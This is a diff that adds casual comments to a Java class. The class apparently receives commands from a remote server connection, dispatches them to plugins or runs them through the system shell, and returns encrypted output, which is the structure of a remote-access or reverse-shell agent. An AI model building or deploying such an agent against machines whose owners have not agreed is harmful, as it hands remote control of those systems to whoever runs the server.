@@ -17,6 +17,7 @@ public class CommandHandler {
 		this.pluginManager = pluginManager;
 	}
 
+	//Handle commands here, well, pass it off to the serverConnection class, but whatever
 	public void handleCommands() throws IOException, Exception {
 		String command;
 		while ((command = serverConnection.readCommand()) != null) {
@@ -25,11 +26,14 @@ public class CommandHandler {
 				break;
 			}
 
+			//Split the command stuff
 			String[] commandParts = command.split(" ", 2);
 			String commandName = commandParts[0].toLowerCase();
+			//If the command starts with a plugin, get it
 			CommandPlugin plugin = pluginManager.getPlugin(commandName);
 
 			if (plugin != null) {
+				//Do the plugin thing
 				String response = plugin.execute(commandParts.length > 1 ? new String[]{commandParts[1]} : new String[]{});
 				if (response != null && !response.isEmpty()) {
 					serverConnection.sendEncryptedResponse(response);
@@ -41,8 +45,10 @@ public class CommandHandler {
 		}
 	}
 
+	//Comand executor
 	public String executeCommand(String command) {
 		StringBuilder output = new StringBuilder();
+		//ToDo -- Make the os, shell, and shell flag fixed variables, so it only has to figure it out once
 		try {
 			String os = System.getProperty("os.name").toLowerCase();
 			String shell;
@@ -55,6 +61,7 @@ public class CommandHandler {
 				shellFlag = "-c";
 			}
 
+			//Make the command
 			ProcessBuilder processBuilder = new ProcessBuilder(shell, shellFlag, command);
 			processBuilder.redirectErrorStream(true);
 			processBuilder.directory(new File(CDCommand.getCurrentDirectory()));
@@ -66,7 +73,7 @@ public class CommandHandler {
 					output.append(line).append("\n");
 				}
 			}
-
+			//If no worky, then say fuck it and give up :)
 			boolean finished = process.waitFor(10, TimeUnit.SECONDS);
 			if (!finished) {
 				process.destroy();
@@ -81,6 +88,7 @@ public class CommandHandler {
 		} catch (IOException | InterruptedException e) {
 			return "Error executing command: " + e.getMessage();
 		}
+		//Return the thing
 		return output.toString().trim();
 	}
 }
